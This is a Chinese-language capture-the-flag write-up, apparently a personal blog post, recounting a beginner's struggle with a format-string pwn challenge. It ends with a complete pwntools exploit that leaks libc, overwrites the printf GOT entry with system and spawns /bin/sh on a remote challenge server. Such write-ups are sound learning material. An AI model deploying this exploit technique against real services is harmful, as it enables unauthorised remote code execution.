# innday echo3 wp


# innday echo3 吐槽 & 记录向 wp

## 一些碎碎念

### 不要靠近奶茶，会变得不幸

上个月月初 （21.11.03） ， chuj 学长在群里说有一个 fmtstr 题只要写出来就可以得到一杯奶茶。显然，我为了奶茶就冲了。学长发给我题的时候是这样形容这个题的：

> 可能会比较有难度

这是比较有难度吗，这是难，很难！

## 令人摸不着头脑的过程

### 瞎搞

#### 一

因为是第一次写 CTF 的题，当然也是第一次写 pwn 题，所以根本不知道该怎么下手，于是就寻求百度的帮助。看了一些 write up 和入门教程之后**大概**明白了要做点什么之后就开始~~做题~~瞎搞了。

把elf下载下来之后，先 checksec ，~~*不过这一步我做了跟没做一样，虽然百度了，但是根本不理解*~~，

然后在 ida 里 F5 了一下，感觉是要修改 magic 的值，然后就开始尝试了。

*当时还是太天真了，代码都没看明白就开始写了。*

第一次尝试失败了，对于向来直接莽的我来说根本整不明白发生了什么，于是直接求助学长，得到的结果是方向错了。

#### 二

在几天的摸鱼之后，再次研究这道题，~~发现我好像上当了~~，总算是接近正确的路线了。开始~~在高数课上~~思考如何获取 system 函数，借鉴网上的入门教程之后认为应该用 shellcode ，就再次询问学长。学长说栈开了不可执行保护，所以不能 shellcode 。

虽然我的方向又错了，但是这次学长给我指了一条明路：泄露 system ，修改 got 表。

### 仿佛走上正轨

为了修改 got 表，要找到一条链。然而第一次尝试的时候运气不太好，并没有发现可以用的链。就再一次步入歧途，思考偏移的问题。然后发现跟偏移好像没什么关系，就又不明白了。一边看各种文章，一边问学长，聊天记录里我懂了又懂。

在某一次尝试之后，我终于发现栈是会变的了！然后又去问学长，~~*这么一看我问题好多啊*~~，得知了栈是随机的。

开始尝试修改 got 表，但是总是失败。于是再~~第 n ~~次求助，开始学习替换 libc 。按照学长的[blog](https://cjovi.icu/pwnreview/941.html) 里的方法替换了libc，但是无论怎么换一直都不能使用。

~~不知道第几次~~去问学长，学长说

> patchelf 是直接在 elf 里面替换的，所以路径过长的时候可能会覆写一起其他数据，这种情况比较少，但是这里好像确实有这个情况

解决方案是把 libc 和 ld 放在 elf 的目录下，然后用相对地址替换。

### 和 exp 纠缠

换好 libc 之后，手打就还算顺利了，但是 exp 成为了新的阻碍。

先是要泄露 libc 的基地址。这一个问题还好，并没有困扰我太长时间。

真正要命的是 sendline 中间的间隔太短导致我本地一直卡，就又摸了好几天的鱼，后来改用 sendafter 就解决了这个问题。

最后一个问题是我试图两次写两个完整的 got 然而远程一直失败，问了学长才知道要考虑网络问题，~~其实也就我会忘记这种事吧~~。

当时我是重新找的链，用栈上残留的地址写 got 。

后来我发现是有第两个解决方案的，直接改一下本来的 exp ，第一个 got 和第二个一起写，空格的数量直接减半。因为之前测试的时候是有几率可以收到第一个的结束标志的，所以第一个是可以成功写进去的，第二个跟着它应该没有问题，就是这个方案需要碰运气。

## EXP

``` python
from pwn import *

while 1:

    libc = ELF('libc-2.23.so')
    echo = remote('node4.buuoj.cn', 26765)

    printf_got = 0x804a014
    try:
        payload1 = '%47$p %18$p !'
        echo.sendline(payload1)

        echo.recvuntil('0x', timeout=1)
        libc_start_add = int(echo.recv(8), 16) - 247
        if libc_start_add < 0xf7000000:
            echo.close()
        if libc_start_add > 0xf8000000:
            echo.close()
        libc_start_off = libc.symbols['__libc_start_main']
        system_off = libc.symbols['system']
        system_addr = libc_start_add - libc_start_off + system_off
        system_addr_low = system_addr % 0x10000
        system_addr_high = (system_addr >> 16) % 0x10000
        printf_got_low = printf_got % 0x10000

        echo.recvuntil('0x', timeout=1)
        addr_2e = int(echo.recv(8), 16)
        addr_09_low = addr_2e % 0x10000 - 0x94

        payload2 = '%' + str(addr_09_low) + 'c' + '%34$hn' + '%8c%35$hn' + '!!'
        echo.sendafter('!', payload2)

        payload3 = '%' + str(printf_got_low) + 'c' + '%91$hn' + '%2c%89$hn' + '!!!'
        echo.sendafter('!!', payload3)

        if system_addr_low < system_addr_high:
            payload4 = '%' + str(system_addr_low) + 'c' + '%9$hn' + '%' + str(system_addr_high - system_addr_low) + 'c' + '%11$hn' + '!!!!'
        else:
            payload4 = '%' + str(system_addr_high) + 'c' + '%11$hn' + '%' + str(system_addr_low - system_addr_high) + 'c' + '%9$hn' + '!!!!'
        echo.sendafter('!!!', payload4)

        payload5 = '/bin/sh\x00'
        echo.sendafter('!!!!', payload5)
        echo.interactive()

    except:
        echo.close()
```

## 最后的碎碎念

我写最后一句话的时候已经是 22.3.21 了，这谁想得到呢。其实 21.12.5 的时候好像就写得差不多了，但是一直没有部署 blog ，所以就放着了。虽然写完了，但是我也不知道最后啥时候发。摸鱼去。

